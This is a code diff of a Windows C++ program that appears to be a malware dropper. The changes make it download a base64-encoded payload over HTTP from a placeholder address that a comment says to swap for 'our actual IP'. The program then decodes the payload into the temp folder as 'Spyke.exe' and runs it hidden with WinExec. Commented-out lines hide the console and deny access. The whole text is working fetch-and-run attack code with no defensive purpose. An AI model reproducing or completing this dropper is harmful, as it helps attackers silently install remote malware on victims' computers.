@@ -5,38 +5,54 @@
 #include "Dropper.h"
 #include "Utils.h"
 #include "Connection.h"
+#include "base64.h"
 
 char* ip = "127.0.0.1";
 TCHAR buf[255] = { 0 };
 Utils utils;
-Connection conn(ip, 9091);
+base64 base;
+//Connection conn(ip, 5000);
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
 	_In_ LPWSTR    lpCmdLine,
 	_In_ int       nCmdShow)
 {
-	//utils.HideConsole();
-	//utils.DenyAccess();
-
-	//Accessing the registry value for autoloading
-
-	// Sending an ID and a message 
-	conn.Send("I am ready to download the file!");
-	conn.Shutdown(); //otherwise it freezes
-	conn.Recv(); // use GetBuf to retrieve the contents of buffer
-
+	// change this IP to our actual IP then
+	TCHAR url[] = TEXT("http://127.0.0.1");
 	TCHAR path[MAX_PATH + 1];
 	DWORD len = MAX_PATH + 1;
 	GetTempPath(len, path);
 	TCHAR* full_path = _tcscat(path, L"Spyke.exe");
 	wstring ws(full_path);
 	string Path = string(ws.begin(), ws.end());
-	ofstream ff(Path.c_str());
-	for (int i = 0; i < 250000; ++i)
-		ff << conn.GetBuf()[i];
-	ff.close();
- 	system(Path.c_str());
+	utils.DownloadFile(url, full_path);
+
+	ifstream ffi(full_path);
+	string based_string;
+	ffi >> based_string;
+	based_string = base.base64_decode(based_string);
+	ffi.close();
+	ofstream ffo(full_path, ios::binary);
+	ffo << based_string;
+	ffo.close();
+
+	WinExec(Path.c_str(), SW_HIDE);
+	/*
+	STARTUPINFOW si;
+	PROCESS_INFORMATION pi;
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	if (CreateProcessW((TCHAR *)Path.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+	{
+		WaitForSingleObject(pi.hProcess, INFINITE);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+	}
+	*/
 
 	return 0;
 }
